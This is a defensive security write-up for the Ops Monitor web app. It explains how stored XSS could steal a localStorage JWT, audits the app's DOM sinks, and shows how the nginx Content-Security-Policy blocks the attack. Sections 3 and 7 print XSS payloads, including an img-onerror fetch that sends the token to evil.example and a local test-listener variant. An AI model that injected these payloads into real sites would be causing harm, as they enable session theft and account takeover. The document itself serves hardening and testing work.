XSS & the localStorage session token

How cross-site scripting could steal a signed-in user's token, why this app is currently exposed without a Content-Security-Policy, and exactly how the CSP now on the frontend nginx defends against it. Written so you can build your own test cases.

First, a correction on the premise script-src 'self' does not enable XSS — it is the defense. The real weakness is "the session token lives in localStorage (readable by any JavaScript) AND there was no CSP". Add a CSP with script-src 'self' and you take away the attacker's ability to run injected script in the first place. This doc explains both halves.

01  The threat model

Ops Monitor authenticates with a JWT bearer token. On login the frontend stores it in the browser:

// frontend/src/lib/api.ts
export const TOKEN_KEY = 'om-token';
localStorage.setItem(TOKEN_KEY, data.token);   // after login / Google callback

Every API call reads it back and sends it as Authorization: Bearer <token>. The token is a 24-hour HS256 JWT — whoever holds it is that user for a full day, with all their property permissions.

The core problem localStorage is plain JavaScript-readable storage. Any script that runs on the page — including one an attacker injects — can call localStorage.getItem('om-token') and send it anywhere. There is no browser boundary protecting it, the way HttpOnly cookies are hidden from JavaScript. So the whole game becomes: can an attacker get any JavaScript to run on the page? That question is exactly what XSS answers, and what CSP shuts down.

02  Three kinds of XSS

TypeWhere the payload livesRelevance to Ops Monitor
Stored Saved in the database, served back to every viewer later. Highest risk class. Device names, floor names, user names, departments — all entered by one user and rendered on other users' dashboards. A stored payload would fire for an admin who opens the floor, stealing their token.
Reflected In a URL/param, echoed straight back into the page. Lower risk here — the SPA renders via React state, not by echoing query strings into HTML.
DOM-based Client JS writes attacker data into a dangerous DOM sink. The one to audit continuously: dangerouslySetInnerHTML, innerHTML, javascript: URLs, eval.

03  A concrete attack, step by step

Imagine a regression: someone "improves" a component to render a device's name with dangerouslySetInnerHTML so it can show rich text. Now the device name is raw HTML. An attacker with create-device permission on one property sets a device name to:

<img src=x onerror="fetch('https://evil.example/c?t='+localStorage.getItem('om-token'))">

What happens without a CSP:

  1. The <img> has a broken src, so the browser fires onerror.
  2. The inline handler runs, reads om-token from localStorage.
  3. It fetch()es the attacker's server with the token in the query string.
  4. The attacker replays Authorization: Bearer <token> and is now that admin for 24h.

Note the payload never contains the word <script>. Inline event handlers (onerror, onload, onmouseover), javascript: URLs, and injected <script src> are all execution vectors. A good defense has to block all of them — which is precisely what script-src 'self' does.

04  This app's real sink audit

Today the codebase does not have a live user-input XSS sink. React escapes {value} in JSX automatically. Here is every DOM sink that exists and why each is currently safe — this is the list to re-check on every PR:

LocationSinkStatusWhy
components/ui/chart.tsx:94 dangerouslySetInnerHTML SAFE Injects a generated <style> of --color-* variables from the developer-defined chart config, not user data. Would become a sink only if chart config ever came from user input.
main.tsx:33 rootElement.innerHTML SAFE It reads (if (!rootElement.innerHTML)) to check emptiness — it never writes attacker data.
floor-map.tsx, floors.tsx, floor-dialog.tsx <img src={floor.image}> INERT A javascript: value in an image src does not execute in modern browsers. (An <a href> or <iframe src> would be the one to guard.)
Everywhere else (device/floor/user names, etc.) {userValue} in JSX SAFE React auto-escapes text interpolation to HTML entities.
So why bother with CSP if nothing is vulnerable today? Because "safe today" is one careless dangerouslySetInnerHTML, one third-party dependency compromise, or one href={userValue} away from "vulnerable tomorrow." CSP is the seatbelt: it turns an account-takeover bug into a blocked-and-logged non-event. Defense in depth means no single mistake is fatal.

05  The layered defense

#LayerWhat it stops
1React auto-escapingThe default. {value} renders as text, not markup. Keep dangerouslySetInnerHTML out of user-data paths.
2Input validation (zod) on the backendShrinks what can be stored, though it is not an XSS defense by itself — output context is.
3CSP script-src 'self'Injected inline handlers, javascript:, and foreign <script> simply do not execute. This is the big one.
4CSP connect-src 'self' / img-srcEven if some script ran, it cannot fetch()/beacon the token to evil.example — the exfiltration channel is closed.
5Short token TTL (24h) + stable JWT_SECRETLimits the replay window; rotating the secret invalidates stolen tokens.
6(Stronger) HttpOnly cookie sessionThe real structural fix — see below.
The structural fix: HttpOnly cookies If the token lived in a Set-Cookie: … HttpOnly; Secure; SameSite=Lax cookie instead of localStorage, JavaScript could never read it — XSS could still act on the user's behalf while they're on the page, but it could not exfiltrate the token for offline replay. The tradeoff is CSRF protection and a backend refactor (the app currently sends Authorization: Bearer from JS). CSP is the pragmatic mitigation that ships today; HttpOnly cookies are the deeper hardening worth planning.

06  CSP vs. the payload, line by line

This is the policy now set on frontend/nginx.conf (the nginx that serves index.html, so the browser enforces it for the whole document):

default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' data: https://fonts.gstatic.com;
img-src 'self' data: blob:;
connect-src 'self';
frame-src 'self' blob:;
object-src 'none';
base-uri 'self';
form-action 'self';
frame-ancestors 'none';

Against the <img onerror=…> payload from §3:

Attack stepDirective that blocks it
The inline onerror="…" handler tries to runscript-src 'self' — no 'unsafe-inline' for scripts, so inline event handlers are refused and a CSP violation is logged.
Attacker instead injects <script src="https://evil/x.js">script-src 'self' — foreign script origin is not allowed.
Attacker injects <a href="javascript:…">script-src 'self' — javascript: URLs are treated as inline script and blocked.
Somehow a script does run and tries fetch('https://evil/…')connect-src 'self' — the request to a non-self origin is blocked; the token can't leave.
Exfil via image beacon new Image().src='https://evil/?t='+tokenimg-src 'self' data: blob: — evil.example is not an allowed image source.
Page is framed by a phishing site to overlay itframe-ancestors 'none' — the app refuses to be embedded (clickjacking guard).
Net effect Every execution path AND every exfiltration path in the classic token-theft chain hits a wall. The attacker's stored HTML becomes inert text-with-a-broken-image instead of an account takeover.

07  Build your own test cases

Run these against a local dev instance you own. The goal is to confirm (a) React escapes the input and (b) the CSP blocks execution. Paste each payload into a user-editable field — a device name, floor name, or your profile name — save, then open the screen that renders it.

Payloads to try

// 1) Classic image-onerror token exfil (the canonical test)
<img src=x onerror="fetch('https://localhost:9999/steal?t='+localStorage.getItem('om-token'))">

// 2) Inline script tag
<script>alert(document.domain)</script>

// 3) SVG onload
<svg onload=alert(1)>

// 4) javascript: link (paste where a URL/link field exists)
javascript:alert(localStorage.getItem('om-token'))

// 5) Breaking-out attempt with quotes/brackets
"><img src=x onerror=alert(1)>

Expected results (the pass criteria)

CheckExpected (secure)
How the value rendersAs literal text — you should see the angle brackets on screen, e.g. <img src=x onerror=…>, not an executed effect. (React escaping.)
Any alert() fires?No. If an alert pops, you have a real sink — fix the render path, don't rely on CSP alone.
Browser consoleIf a payload ever does inject markup, the console shows "Refused to execute inline event handler because it violates the following Content Security Policy directive: script-src 'self'". That message is the CSP working.
Network tabNo request to your localhost:9999 listener. Run python3 -m http.server 9999 and confirm it logs nothing.

Confirm the CSP is actually being served

# The header must be present on the HTML document response
curl -sI http://localhost/ | grep -i content-security-policy

# In the browser devtools console, this should print nothing new,
# but a violation logs a "Content Security Policy" error you can watch for.
Testing gotcha In bun run dev (Vite dev server) the CSP header is not applied — it lives in the nginx layer, which only runs in the Docker build. Test the CSP against the built stack (docker compose up -d --build), not the dev server. React escaping, however, you can test in dev.

08  What CSP does NOT protect

  • It is not a substitute for escaping. CSP stops script execution, but injected HTML can still deface the page, inject a fake login form, or rewrite links. Correct output encoding (React's default) is still layer one.
  • style-src 'unsafe-inline' stays open. The app needs it for React inline style={} and runtime chart styles. CSS-only exfiltration is far weaker than JS, but it isn't zero — avoid rendering user data into raw <style>.
  • On-page actions during a live XSS. If a sink existed, script blocked from exfiltrating could still, in theory, call same-origin /api as the user while they're on the page. HttpOnly cookies + CSRF tokens address that class; short of that, keep sinks out of user-data paths.
  • Extensions and same-origin injection. CSP governs page content, not malicious browser extensions or a compromise of your own 'self' bundle (supply-chain). Pin and audit dependencies.
